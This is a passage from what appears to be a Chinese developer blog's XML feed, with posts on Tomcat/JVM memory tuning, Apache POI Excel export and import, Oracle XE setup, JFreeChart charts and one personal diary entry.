同NewRation一样，SurvivorRation规定某救助域与Eden空间的比值。比如，以下命令把新域设置成64m，Eden占32m，每个救助域各占16m：<br>java -Xms256m -Xmx256m -Xmn64m -XX:SurvivorRation =2<br>　　如前所述，默认状态下HotSpot对新域使用复制收集器，对旧域使用标记－清除－压缩收集器。在新域中使用复制收集器有很多意义，因为应用程序生成的大部分对象是短寿命的。理想状态下，所有过渡对象在移出Eden空间时将被收集。如果能够这样的话，并且移出Eden空间的对象是长寿命的，那么理论上可以立即把它们移进旧域，避免在救助空间反复复制。但是，应用程序不能适合这种理想状态，因为它们有一小部分中长寿命的对象。最好是保持这些中长寿命的对象并放在新域中，因为复制小部分的对象总比压缩旧域廉价。为控制新域中对象的复制，可用-XX:TargetSurvivorRatio控制救助空间的比例（该值是设置救助空间的使用比例。如救助空间位1M，该值50表示可用500K）。该值是一个百分比，默认值是50。当较大的堆栈使用较低的sruvivorratio时，应增加该值到80至90，以更好利用救助空间。用-XX:maxtenuring threshold可控制上限。<br>　　为放置所有的复制全部发生以及希望对象从eden扩展到旧域，可以把MaxTenuring Threshold设置成0。设置完成后，实际上就不再使用救助空间了，因此应把SurvivorRatio设成最大值以最大化Eden空间，设置如下：<br>java … -XX:MaxTenuringThreshold=0 –XX:SurvivorRatio＝50000 …<br>垃圾回收描述：<br>垃圾回收分多级，0级为全部(Full)的垃圾回收，会回收OLD段中的垃圾；1级或以上为部分垃圾回收，只会回收Young中的垃圾，内存溢出通常发生于OLD段或Perm段垃圾回收后，仍然无内存空间容纳新的Java对象的情况。<br>当一个URL被访问时，内存申请过程如下：<br>A. JVM会试图为相关Java对象在Eden中初始化一块内存区域<br>B. 当Eden空间足够时，内存申请结束。否则到下一步<br>C. JVM试图释放在Eden中所有不活跃的对象（这属于1或更高级的垃圾回收）；释放后若Eden空间仍然不足以放入新对象，则试图将部分Eden中活跃对象放入Survivor区/OLD区<br>D. Survivor区被用来作为Eden及OLD的中间交换区域，当OLD区空间足够时，Survivor区的对象会被移到Old区，否则会被保留在Survivor区<br>E. 当OLD区空间不够时，JVM会在OLD区进行完全的垃圾收集（0级）<br>F. 完全垃圾收集后，若Survivor及OLD区仍然无法存放从Eden复制过来的部分对象，导致JVM无法在Eden区为新对象创建内存区域，则出现”out of memory错误”<br>Java堆相关参数：<br>ms/mx：定义YOUNG+OLD段的总尺寸，ms为JVM启动时YOUNG+OLD的内存大小；mx为最大可占用的YOUNG+OLD内存大小。在用户生产环境上一般将这两个值设为相同，以减少运行期间系统在内存申请上所花的开销。<br>NewSize/MaxNewSize：定义YOUNG段的尺寸，NewSize为JVM启动时YOUNG的内存大小；MaxNewSize为最大可占用的YOUNG内存大小。在用户生产环境上一般将这两个值设为相同，以减少运行期间系统在内存申请上所花的开销。<br>PermSize/MaxPermSize：定义Perm段的尺寸，PermSize为JVM启动时Perm的内存大小；MaxPermSize为最大可占用的Perm内存大小。在用户生产环境上一般将这两个值设为相同，以减少运行期间系统在内存申请上所花的开销。<br>SurvivorRatio：设置Survivor空间和Eden空间的比例<br>例：<br>MEM_ARGS=”-Xms512m -Xmx512m -XX:NewSize=256m -XX:MaxNewSize=256m -XX:PermSize=128m -XX:MaxPermSize=128m -XX:SurvivorRatio=6”<br>在上面的例子中：<br>YOUNG+OLD: 512M<br>YOUNG: 256M<br>Perm: 128M<br>Eden: YOUNG*6/(6+1+1)=192M<br>Survivor: YOUNG/(6+1+1)=32M<br>Java堆的总尺寸=YOUNG+OLD+Perm=640M</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Tomcat内存溢出的原因&lt;br&gt;　　在生产环境中tomcat内存设置不好很容易出现内存溢出。造成内存溢出是不一样的，当然处理方式也不一样。&lt;br&gt;　　这里根据平时遇到的情况和相关资料进行一个总结。常见的一般会有下面三种情况：&lt;br&gt;　　1.OutOfMemoryError： Java heap space&lt;br&gt;　　2.OutOfMemoryError： PermGen space&lt;br&gt;　　3.OutOfMemoryError： unable to create new native thread.&lt;br&gt;　　Tomcat内存溢出解决方案&lt;br&gt;　　对于前两种情况，在应用本身没有内存泄露的情况下可以用设置tomcat jvm参数来解决。（-Xms -Xmx -XX：PermSize -XX：MaxPermSize）&lt;br&gt;　　最后一种可能需要调整操作系统和tomcat jvm参数同时调整才能达到目的。&lt;br&gt;　　第一种：是堆溢出。&lt;br&gt;　　原因分析：&lt;br&gt;JVM堆的设置是指java程序运行过程中JVM可以调配使用的内存空间的设置.JVM在启动的时候会自动设置Heap size的值，其初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可进行设置。Heap size 的大小是Young Generation 和Tenured Generaion 之和。&lt;br&gt;在JVM中如果98％的时间是用于GC且可用的Heap size 不足2％的时候将抛出此异常信息。&lt;br&gt;Heap Size 最大不要超过可用物理内存的80％，一般的要将-Xms和-Xmx选项设置为相同，而-Xmn为1/4的-Xmx值。&lt;br&gt;　　没有内存泄露的情况下，调整-Xms -Xmx参数可以解决。&lt;br&gt;　　-Xms：初始堆大小&lt;br&gt;　　-Xmx：最大堆大小&lt;br&gt;　　但堆的大小受下面三方面影响：&lt;br&gt;　　1.相关操作系统的数据模型（32-bt还是64-bit）限制；（32位系统下，一般限制在1.5G~2G；我在2003 server 系统下（物理内存：4G和6G，jdk：1.6）测试 1612M，64位操作系统对内存无限制。）&lt;br&gt;　　2.系统的可用虚拟内存限制；&lt;br&gt;　　3.系统的可用物理内存限制。&lt;br&gt;　　堆的大小可以使用 java -Xmx&lt;em&gt;*&lt;/em&gt;M version 命令来测试。支持的话会出现jdk的版本号，不支持会报错。&lt;br&gt;　　-Xms -Xmx一般配置成一样比较好比如set JAVA_OPTS= -Xms1024m -Xmx1024m&lt;br&gt;其初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可&lt;br&gt;进行设置&lt;br&gt;实例，以下给出1G内存环境下java jvm 的参数设置参考：&lt;br&gt;JAVA_OPTS=”-server -Xms800m -Xmx800m -XX:PermSize=64M -XX:MaxNewSize=256m -XX:MaxPermSize=128m -Djava.awt.headless=true “&lt;br&gt;JAVA_OPTS=”-server -Xms768m -Xmx768m -XX:PermSize=128m -XX:MaxPermSize=256m -XX:&lt;br&gt;NewSize=192m -XX:MaxNewSize=384m”&lt;br&gt;CATALINA_OPTS=”-server -Xms768m -Xmx768m -XX:PermSize=128m -XX:MaxPermSize=256m&lt;br&gt;-XX:NewSize=192m -XX:MaxNewSize=384m”&lt;br&gt;服务器为1G内存：JAVA_OPTS=”-server -Xms800m -Xmx800m -XX:PermSize=64M -XX:MaxNewSize=256m -XX:MaxPermSize=128m -Djava.awt.headless=true “&lt;br&gt;服务器为64位、2G内存: JAVA_OPTS=’-server -Xms1024m -Xmx1536m -XX:PermSize=128M -XX:MaxNewSize=256m -XX:MaxPermSize=256m’&lt;br&gt;——————-解决方案1：—————————–&lt;br&gt;前提：是执行startup.bat启动tomcat的方式&lt;br&gt;Linux服务器：&lt;br&gt;在/usr/local/apache-tomcat-5.5.23/bin 目录下的catalina.sh&lt;br&gt;添加：JAVA_OPTS=’-Xms512m -Xmx1024m’&lt;br&gt;或者 JAVA_OPTS=”-server -Xms800m -Xmx800m -XX:MaxNewSize=256m”&lt;br&gt;或者 CATALINA_OPTS=”-server -Xms256m -Xmx300m”&lt;br&gt;Windows服务器：&lt;br&gt;在catalina.bat最前面加入&lt;br&gt;set JAVA_OPTS=-Xms128m -Xmx350m&lt;br&gt;或者set CATALINA_OPTS=-Xmx300M -Xms256M&lt;br&gt;（区别是一个直接设置jvm内存，另一个设置tomcat内存，CATALINA_OPTS似乎可以与JAVA_OPTS不加区别的使用）&lt;br&gt;基本参数说明&lt;br&gt;-client，-server&lt;br&gt;这两个参数用于设置虚拟机使用何种运行模式，一定要作为第一个参数，client模式启动比较快，但运行时性能和内存管理效率不如server模式，通常用于客户端应用程序。相反，server模式启动比client慢，但可获得更高的运行性能。&lt;br&gt;在windows上，缺省的虚拟机类型为client模式，如果要使用server模式，就需要在启动虚拟机时加-server参数，以获得更高性能，对服务器端应用，推荐采用server模式，尤其是多个CPU的系统。在Linux，Solaris上缺省采用server模式。&lt;br&gt;此外，在多cup下，建议用server模式&lt;br&gt;-Xms&lt;size&gt;&lt;br&gt;设置虚拟机可用内存堆的初始大小，缺省单位为字节，该大小为1024的整数倍并且要大于1MB，可用k(K)或m(M)为单位来设置较大的内存数。初始堆大小为2MB。加“m”说明是MB，否则就是KB了。&lt;br&gt;例如：-Xms6400K，-Xms256M&lt;br&gt;-Xmx&lt;size&gt;&lt;br&gt;设置虚拟机的最大可用大小，缺省单位为字节。该值必须为1024整数倍，并且要大于2MB。可用k(K)或m(M)为单位来设置较大的内存数。缺省堆最大值为64MB。&lt;br&gt;例如：-Xmx81920K，-Xmx80M&lt;br&gt;当应用程序申请了大内存运行时虚拟机抛出java.lang.OutOfMemoryError: Java heap space错误，就需要使用-Xmx设置较大的可用内存堆。&lt;br&gt;PermSize/MaxPermSize：定义Perm段的尺寸，即永久保存区域的大小，PermSize为JVM启动时初始化Perm的内存大小；MaxPermSize为最大可占用的Perm内存大小。在用户生产环境上一般将这两个值设为相同，以减少运行期间系统在内存申请上所花的开销。&lt;br&gt;如果用startup.bat启动tomcat,OK设置生效.够成功的分配200M内存.&lt;br&gt;——————-解决方案2：————————&lt;br&gt;前提：是执行startup.bat启动tomcat的方式&lt;br&gt;手动设置Heap size&lt;br&gt;Windows服务器：&lt;br&gt;修改TOMCAT_HOME/bin/catalina.bat，在“echo “Using CATALINA_BASE: $CATALINA_BASE””上面加入以下行：&lt;br&gt;Java代码&lt;br&gt;set JAVA_OPTS=%JAVA_OPTS% -server -Xms800m -Xmx800m -XX:MaxNewSize=256m&lt;br&gt;
    
    </summary>
    
      <category term="技术" scheme="http://burinicc.cn/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="tomcat" scheme="http://burinicc.cn/tags/tomcat/"/>
    
  </entry>
  
  <entry>
    <title>apache poi 使用中文说明书</title>
    <link href="http://burinicc.cn/2016/12/01/apache-poi-%E4%BD%BF%E7%94%A8%E4%B8%AD%E6%96%87%E8%AF%B4%E6%98%8E%E4%B9%A6/"/>
    <id>http://burinicc.cn/2016/12/01/apache-poi-使用中文说明书/</id>
    <published>2016-12-01T02:55:43.000Z</published>
    <updated>2016-12-01T09:58:09.568Z</updated>
    
    <content type="html"><![CDATA[<p>XSSF导出 excel<br>1.导入jar包</p>
<p>2.拷贝工具类ExcelExportSXXSSF</p>
<p>XSSF操作03以上版本（07版本）excel，扩展名.xlsx，工作表行数没有限制<br>3.配置虚拟目录<br>在host标签中配置如下：</p>
<p><context path="/vir/" docbase="d:/upload/" reloadable="true"><br>这样在浏览上输入：<br><a href="http://ip地址：端口号/vir/" target="_blank" rel="external">http://ip地址：端口号/vir/</a><br>就可以访问d:/upload/目录下的文件了！servlet中可以使用如下代码得到webpath<br>/**            导出文件存放物理路径</context></p>
<pre><code> * @param fileWebPath
 *            导出文件web下载路径
 * @param filePrefix
 *            导出文件名的前缀          
 * @param flushRows
 *            存放在内存的数据量
 * @param fieldNames
 *            导出文件列标题
 * @param fieldCodes
 *               导出数据对象的字段名称     
 * @param flushRows*/
//导出文件存放的路径，并且是虚拟目录指向的路径
String filePath = &quot;d:/upload/&quot;;
//导出文件的前缀
String filePrefix=&quot;studentinfo&quot;;
//-1表示关闭自动刷新，手动控制写磁盘的时机，其它数据表示多少数据在内存保存，超过的则写入磁盘
int flushRows=100;

//定义导出数据的title
List&lt;String&gt; fieldNames=new ArrayList&lt;String&gt;();
fieldNames.add(&quot;性别&quot;);
fieldNames.add(&quot;年龄&quot;);
fieldNames.add(&quot;姓名&quot;);
fieldNames.add(&quot;爱好&quot;);

//告诉导出类数据list中对象的属性，让ExcelExportSXXSSF通过反射获取对象的值
List&lt;String&gt; fieldCodes=new ArrayList&lt;String&gt;();
fieldCodes.add(&quot;gender&quot;);//药品流水号
fieldCodes.add(&quot;age&quot;);//通用名
fieldCodes.add(&quot;name&quot;);//价格
fieldCodes.add(&quot;hobbies&quot;);



//注意：fieldCodes和fieldNames个数必须相同且属性和title顺序一一对应，这样title和内容才一一对应


//开始导出，执行一些workbook及sheet等对象的初始创建
ExcelExportSXXSSF excelExportSXXSSF = ExcelExportSXXSSF.start(filePath, &quot;/vir&quot;, filePrefix, fieldNames, fieldCodes, flushRows);

//准备导出的数据，将数据存入list，且list中对象的字段名称必须是刚才传入ExcelExportSXXSSF的名称
List&lt;Student&gt; list = new ArrayList&lt;Student&gt;();

list.add(new Student(&quot;男&quot;, 23, &quot;张三&quot;, &quot;乒乓球,羽毛球&quot;));
list.add(new Student(&quot;男&quot;, 24, &quot;李四&quot;, &quot;篮球,羽毛球&quot;));
list.add(new Student(&quot;女&quot;, 25, &quot;小红&quot;, &quot;高尔夫,羽毛球&quot;));
list.add(new Student(&quot;男&quot;, 23, &quot;小刘&quot;, &quot;乒乓球,羽毛球&quot;));

//执行导出
excelExportSXXSSF.writeDatasByObject(list);
//输出文件，返回下载文件的http地址
String webpath = excelExportSXXSSF.exportFile();

System.out.println(webpath);
</code></pre><a id="more"></a>
<p>总结：通过<br><a href="http://localhost:8089/vir/studentinfo_20161128200022.xlsx" target="_blank" rel="external">http://localhost:8089/vir/studentinfo_20161128200022.xlsx</a><br>就可以导出Excel文件了！<br>HSSF导入excel文件</p>
<p>将线下编辑好的excel导入系统中，从客户端导入服务端。</p>
<p>第一步：线下编辑导入文件<br>   根据提前定义好的导入文件规则去定义，根据导入模块编写导入文件。</p>
<p>第二步：登陆系统，执行导入<br>   将本地的文件上传到服务端<br>第三步：服务端程序解析导入文件内容<br>   读文件过程。<br>HSSF事件驱动模式</p>
<p>事件驱动式，类似xml的sax解析。</p>
<p>需要实现HSSFListener接口。</p>
<p>原理：根据excel底层存储（07以版本采用xml存储，以下版本采用二进制）标签决定事件出发点。<br>目标：在解析完一行(row)数据时进行触发。</p>
<!--more-->
<p>优点：读取大数据时，不会导致内存溢出<br>缺点：用户在解析数据时比较困难。读取数据时速度不快的，因为读取数据的同时根据每个标签进行事件触发<br>使用数据导入封装类方法：<br>实现HxlsOptRowsInterface（service）<br>根据具体业务需求，实现此接口</p>
<p>文件上传的action</p>
<p>在action调用工具类<br>使用HxlsRead工具类执行数据导入，需要上传文件<br>文件上传需要在springmvc.xml中配置：<br>        <!-- 文件上传 --><br>    <bean id="multipartResolver" class="org.springframework.web.multipart.commons.CommonsMultipartResolver"><br>        <!-- 设置上传文件的最大尺寸为5MB --><br>        <property name="maxUploadSize"><br>            <value>5242880</value><br>        </property><br>    </bean><br>Action：<br>//药品导入提交<br>    @RequestMapping(“/importypxxsubmit”)<br>    public @ResponseBody SubmitResultInfo importypxxsubmit(<br>            //写上传的文件<br>            MultipartFile ypxximportfile<br>            )throws Exception{</p>
<pre><code>//将上传的文件写到磁盘
String originalFilename  = ypxximportfile.getOriginalFilename();
//写入磁盘的文件
File file = new File(&quot;D:/upload/linshi/&quot;+UUIDBuild.getUUID()+originalFilename.substring(originalFilename.lastIndexOf(&quot;.&quot;)));
if(!file.exists()){
    //如果文件目录 不存在则创建
    file.mkdirs();
}

//将内存中的文件写磁盘
ypxximportfile.transferTo(file);
//上传文件磁盘上路径
String absolutePath = file.getAbsolutePath();
</code></pre><!--more-->
<pre><code>//调用工具类进行药品目录 导入
HxlsRead xls2csv = null;
try {
    //第一个参数就是导入的文件
    //第二个参数就是导入文件中哪个sheet
    //第三个参数导入接口的实现类对象
    xls2csv = new HxlsRead(absolutePath,1,ypxxImportService);
    xls2csv.process();
} catch (FileNotFoundException e) {
    e.printStackTrace();
} catch (IOException e) {
    e.printStackTrace();
} catch (SQLException e) {
    e.printStackTrace();
}

//提示导入成功条数
long success_num = xls2csv.getOptRows_success();
//导入失败数量
long failure_num = xls2csv.getOptRows_failure();

//对导入失败记录处理
//获取导入失败记录
//xls2csv.getFailrows()
//获取导入记录的title
//xls2csv.getRowtitle();
//获取导入失败原因
//xls2csv.getFailmsgs()

//将上边获取到的失败记录、title、失败原因，导出成一个 excel
//使用工具类进行导出，得到导出文件下载路径
//......


return ResultUtil.createSubmitResult(ResultUtil.createSuccess(Config.MESSAGE, 314, new Object[]{
        success_num,failure_num
}));
</code></pre><p>实现HxlsOptRowsInterface的方法参考</p>
<p>目录下的YpxxImportServiceImpl.java</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XSSF导出 excel&lt;br&gt;1.导入jar包&lt;/p&gt;
&lt;p&gt;2.拷贝工具类ExcelExportSXXSSF&lt;/p&gt;
&lt;p&gt;XSSF操作03以上版本（07版本）excel，扩展名.xlsx，工作表行数没有限制&lt;br&gt;3.配置虚拟目录&lt;br&gt;在host标签中配置如下：&lt;/p&gt;
&lt;p&gt;&lt;Context path=&quot;/vir/&quot; docBase=&quot;d:/upload/&quot; reloadable=&quot;true&quot; /&gt;&lt;br&gt;这样在浏览上输入：&lt;br&gt;&lt;a href=&quot;http://ip地址：端口号/vir/&quot;&gt;http://ip地址：端口号/vir/&lt;/a&gt;&lt;br&gt;就可以访问d:/upload/目录下的文件了！servlet中可以使用如下代码得到webpath&lt;br&gt;/**            导出文件存放物理路径&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; * @param fileWebPath
 *            导出文件web下载路径
 * @param filePrefix
 *            导出文件名的前缀          
 * @param flushRows
 *            存放在内存的数据量
 * @param fieldNames
 *            导出文件列标题
 * @param fieldCodes
 *               导出数据对象的字段名称     
 * @param flushRows*/
//导出文件存放的路径，并且是虚拟目录指向的路径
String filePath = &amp;quot;d:/upload/&amp;quot;;
//导出文件的前缀
String filePrefix=&amp;quot;studentinfo&amp;quot;;
//-1表示关闭自动刷新，手动控制写磁盘的时机，其它数据表示多少数据在内存保存，超过的则写入磁盘
int flushRows=100;

//定义导出数据的title
List&amp;lt;String&amp;gt; fieldNames=new ArrayList&amp;lt;String&amp;gt;();
fieldNames.add(&amp;quot;性别&amp;quot;);
fieldNames.add(&amp;quot;年龄&amp;quot;);
fieldNames.add(&amp;quot;姓名&amp;quot;);
fieldNames.add(&amp;quot;爱好&amp;quot;);

//告诉导出类数据list中对象的属性，让ExcelExportSXXSSF通过反射获取对象的值
List&amp;lt;String&amp;gt; fieldCodes=new ArrayList&amp;lt;String&amp;gt;();
fieldCodes.add(&amp;quot;gender&amp;quot;);//药品流水号
fieldCodes.add(&amp;quot;age&amp;quot;);//通用名
fieldCodes.add(&amp;quot;name&amp;quot;);//价格
fieldCodes.add(&amp;quot;hobbies&amp;quot;);



//注意：fieldCodes和fieldNames个数必须相同且属性和title顺序一一对应，这样title和内容才一一对应


//开始导出，执行一些workbook及sheet等对象的初始创建
ExcelExportSXXSSF excelExportSXXSSF = ExcelExportSXXSSF.start(filePath, &amp;quot;/vir&amp;quot;, filePrefix, fieldNames, fieldCodes, flushRows);

//准备导出的数据，将数据存入list，且list中对象的字段名称必须是刚才传入ExcelExportSXXSSF的名称
List&amp;lt;Student&amp;gt; list = new ArrayList&amp;lt;Student&amp;gt;();

list.add(new Student(&amp;quot;男&amp;quot;, 23, &amp;quot;张三&amp;quot;, &amp;quot;乒乓球,羽毛球&amp;quot;));
list.add(new Student(&amp;quot;男&amp;quot;, 24, &amp;quot;李四&amp;quot;, &amp;quot;篮球,羽毛球&amp;quot;));
list.add(new Student(&amp;quot;女&amp;quot;, 25, &amp;quot;小红&amp;quot;, &amp;quot;高尔夫,羽毛球&amp;quot;));
list.add(new Student(&amp;quot;男&amp;quot;, 23, &amp;quot;小刘&amp;quot;, &amp;quot;乒乓球,羽毛球&amp;quot;));

//执行导出
excelExportSXXSSF.writeDatasByObject(list);
//输出文件，返回下载文件的http地址
String webpath = excelExportSXXSSF.exportFile();

System.out.println(webpath);
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技术" scheme="http://burinicc.cn/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="Apache poi" scheme="http://burinicc.cn/tags/Apache-poi/"/>
    
  </entry>
  
  <entry>
    <title> oracle Express Edition安装中文说明</title>
    <link href="http://burinicc.cn/2016/12/01/oracle-Express-Edition%E5%AE%89%E8%A3%85%E4%B8%AD%E6%96%87%E8%AF%B4%E6%98%8E/"/>
    <id>http://burinicc.cn/2016/12/01/oracle-Express-Edition安装中文说明/</id>
    <published>2016-12-01T02:54:16.000Z</published>
    <updated>2016-12-01T09:57:57.918Z</updated>
    
    <content type="html"><![CDATA[<p>P1：解压移动硬盘下的OracleXE112_Win64.zip，运行setup.exe，安装oracle  express 版本<br>P2： 解压移动硬盘下的32位的Instantclient-basic-nt-11.2.0.2.0.zip到E盘<br>P3：PL/SQL Developer使用InstantClient连接Oracle服务器，将C:\oraclexe\app\oracle\product\11.2.0\server\network\ADMIN下的tnsnames.ora拷贝到Instantclient-basic-nt-11.2.0.2.0.zip解压目录下；<br>P4. 打开PLSQL Developer，点击取消按钮，在首先项中设置Oracle_Home和OCI Library：<br>ToolsPreferencesOracleConnection：<br>Oracle_Home：Instantclient-basic-nt-11.2.0.2.0.zip解压目录<br>OCI Library：Instantclient-basic-nt-11.2.0.2.0.zip解压目录\oci.dll<br>P5 新建plsql.bat文件，文件内容如下：<br>@echo off<br>set path= Instantclient-basic-nt-11.2.0.2.0.zip解压目录<br>set ORACLE_HOME= Instantclient-basic-nt-11.2.0.2.0.zip解压目录<br>set TNS_ADMIN= Instantclient-basic-nt-11.2.0.2.0.zip解压目录<br>set NLS_LANG=AMERICAN_AMERICA.ZHS16GBK//可以解决中文乱码问题<br>start plsqldev.exe</p>
<p>P5 将新建的plsql.bat文件copy在PLSQL Developer目录下，替换PLSQL Developer的桌面创建方式，用新建的plsql.bat文件启动PLSQL Developer;</p>
<p>P6:用管理员账户和密码（用户名：sys，密码是你安装oracle服务端时设置的口令）就可以登录oracle系统了</p>
<p>P8 使用超级管理登陆pl/sql,选择命令窗口,创建表空间:<br>create  tablespace 表空间名称：<br>logging<br>datafile ‘ 表空间数据文件’   –表空间数据文件位置在oracle服务器（如果是虚拟机，位置在虚拟机上）<br>size 32m<br>autoextend on<br>next 32m maxsize 2048m<br>extent management local;</p>
<p>P9:使用sys创建oracle用户（业务系统连接oracle使用的用户）<br>create user用户名 identified by 密码<br>default  tablespace 默认表空间<br>temporary tablespace temp;<br>给用户授权：<br>grant connect,resource,dba to用户名;<br>P10：退出sys，使用新创建用户登陆pl/sql;s</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;P1：解压移动硬盘下的OracleXE112_Win64.zip，运行setup.exe，安装oracle  express 版本&lt;br&gt;P2： 解压移动硬盘下的32位的Instantclient-basic-nt-11.2.0.2.0.zip到E盘&lt;br&gt;P3：PL/SQ
    
    </summary>
    
      <category term="技术" scheme="http://burinicc.cn/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="oracle安装" scheme="http://burinicc.cn/tags/oracle%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>帮你分析一下神经病人的具体定义</title>
    <link href="http://burinicc.cn/2016/12/01/%E5%B8%AE%E4%BD%A0%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B%E7%A5%9E%E7%BB%8F%E7%97%85%E4%BA%BA%E7%9A%84%E5%85%B7%E4%BD%93%E5%AE%9A%E4%B9%89/"/>
    <id>http://burinicc.cn/2016/12/01/帮你分析一下神经病人的具体定义/</id>
    <published>2016-12-01T02:46:12.000Z</published>
    <updated>2016-12-01T09:58:54.074Z</updated>
    
    <content type="html"><![CDATA[<p>以下所有内容均为白日呓语:<br>想太多我确定我是一个膨胀自负，明知道自己不行还会硬撑面子的人。这种人在文学作品中总是逞一时风光，到后面死的很惨，惨到让观者大呼过瘾。另w，这种人有一种自带的被动叫做「想太多」。这种 debuff 经常让我不知不觉身处尴尬之中，事情太多、太尴尬，每每想到自己都会脸红。<br>我挺喜欢小剥皮。<br>想了一下，不能形容为「欢乐要建立在别人的痛苦之上」，毕竟看见某些惨状我只会恶心而不是欢乐。</p>
<pre><code>在同一件事上，我与他人付出了同样的努力，然而别人要比我差的时候，我会感到开心。
在同一件事上，我比他人付出了更多，别人比我差的时候，我也会开心。
若是不能比，或者我比他人差，那么就没得谈了，怎么开心得起来。
</code></pre><p>小剥皮不像是乔大帝，乔大帝不努力。小剥皮会用尽手段以达到自己的目的。</p>
<p>『怠惰啊！』</p>
<p>这种欢乐来自于膨胀自负带来的优越感。优越感也带来一点负罪感，可是冥冥中有个声音告诉我我不该这么做。<br>我五年内都不会有女朋友</p>
<pre><code>也不会有男朋友。
</code></pre><p>不是说搬出去住么，又是一周了。与其说没有找到合适的房源，不如说是自己没有找。</p>
<pre><code>我爸问我搬出去是不是因为谈恋爱了。
我说不是。
然后又问我不去外地实习是不是因为女友在成都。
我说不是。
我说，我五年内都不会有女朋友，要是有的话我把名字倒着写一个月。
</code></pre><p>自己渣就别去祸害别人了。</p>
<p>喝醉了就别到处说出洋相了。</p>
<p>失恋了就别找异性倾诉，万一别人不喜欢你呢？</p>
<p>你这是媚俗，是斯德哥尔摩综合征，别人想看就看不想看就不看，你还非要粘着别人不放。<br>拜托，大家都很忙的。</p>
<p>以上所有内容均为白日呓语。<br>下面才是由衷的：</p>
<p>想看的看，不想看的就别看</p>
<p>喵~ 就是这样</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以下所有内容均为白日呓语:&lt;br&gt;想太多我确定我是一个膨胀自负，明知道自己不行还会硬撑面子的人。这种人在文学作品中总是逞一时风光，到后面死的很惨，惨到让观者大呼过瘾。另w，这种人有一种自带的被动叫做「想太多」。这种 debuff 经常让我不知不觉身处尴尬之中，事情太多、太尴
    
    </summary>
    
      <category term="生活" scheme="http://burinicc.cn/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="感情" scheme="http://burinicc.cn/tags/%E6%84%9F%E6%83%85/"/>
    
      <category term="思考" scheme="http://burinicc.cn/tags/%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>jfreechar使用说明书</title>
    <link href="http://burinicc.cn/2016/12/01/jfreechar%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E%E4%B9%A6/"/>
    <id>http://burinicc.cn/2016/12/01/jfreechar使用说明书/</id>
    <published>2016-12-01T02:17:53.000Z</published>
    <updated>2016-12-01T09:58:13.183Z</updated>
    
    <content type="html"><![CDATA[<p>思路：<br>在action代码中，生成图形，把图片的名称暂存到session中，在页面中通过img展示生成的图形，通过jfreechart的servlet输出图形<br>解决方案：<br>一、导入jar包：<br>jcommns.jar<br>jfreechart.jar<br>二、配置jfreechart的servlet<br>    &lt;!-jfreechart –&gt;<br>    org.jfree.chart.servlet.DisplayChart<br>三、Action中配置:<br>第一步：准备dataset<br>DefaultCategoryDataset dataset=new DefaultCategoryDataset();<br>        for (YycgdmxCustom yycgdmxCustom : list) {<br>            //第一个参数：统计数值，第二个参数：统计指标名称，第三个参数：统计分类<br>            dataset.addValue(yycgdmxCustom.getCgje(), “采购金额”, yycgdmxCustom.getAreaname());<br>        }<br>        for (YycgdmxCustom yycgdmxCustom : list) {<br>            //第一个参数：统计数值，第二个参数：统计指标名称，第三个参数：统计分类<br>            dataset.addValue(yycgdmxCustom.getCgl(), “采购量”, yycgdmxCustom.getAreaname());<br>        }<br>解决中文乱码：<br>//创建主题样式<br>           StandardChartTheme standardChartTheme=new StandardChartTheme(“CN”);<br>           //设置标题字体<br>           standardChartTheme.setExtraLargeFont(new Font(“隶书”,Font.BOLD,20));<br>           //设置图例的字体<br>           standardChartTheme.setRegularFont(new Font(“宋书”,Font.PLAIN,15));<br>           //设置轴向的字体<br>           standardChartTheme.setLargeFont(new Font(“宋书”,Font.PLAIN,15));<br>           //应用主题样式<br>           ChartFactory.setChartTheme(standardChartTheme);<br>第二步：创建chart<br>柱状图：<br>JFreeChart chart=ChartFactory.createBarChart3D(“药品采购金额汇总”,//图形名称<br>                “”,//分类名称，为横坐标名称<br>                “采购金额”,//值名称，为纵坐标名称<br>                dataset,//数据集合<br>                PlotOrientation.VERTICAL,//垂直显示<br>                true,//是否显示图例<br>                false,//是否使用工具提示<br>                false);//是否使用url<br>        //在柱上显示数值<br>        CategoryPlot plot=chart.getCategoryPlot();<br>        BarRenderer3D renderer=new BarRenderer3D();<br>        //设置柱的颜色<br>        renderer.setSeriesPaint(0, Color.decode(“#ffffff”));<br>        renderer.setBaseItemLabelGenerator(new StandardCategoryItemLabelGenerator());<br>        renderer.setBaseItemLabelsVisible(true);<br>        //默认的数字显示在柱中，通过下面两句可以调整数字的显示位置<br>        renderer.setBasePositiveItemLabelPosition(new ItemLabelPosition(ItemLabelAnchor.OUTSIDE12, TextAnchor.BASELINE_LEFT));<br>        renderer.setItemLabelAnchorOffset(10D);<br>        plot.setRenderer(renderer);<br>第三步：将jfreechart得到的文件名传到页面<br>//将chart注入到jfreechart的工具中得到filename，把图片保存在session中，并把filename传到页面。<br>        String jfreechart_filename=<br>        ServletUtilities.saveChartAsPNG(chart,900,500,null,session);        model.addAttribute(“jfreechart_filename”,jfreechart_filename);<br>四、配置jsp页面<br>&lt;!—jfreechart图形–&gt;<br>在jsp页面添加img标签 属性src=”${baseurl}/jfreechart?filename=${jfreechart_filename}”</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;思路：&lt;br&gt;在action代码中，生成图形，把图片的名称暂存到session中，在页面中通过img展示生成的图形，通过jfreechart的servlet输出图形&lt;br&gt;解决方案：&lt;br&gt;一、导入jar包：&lt;br&gt;jcommns.jar&lt;br&gt;jfreechart.jar
    
    </summary>
    
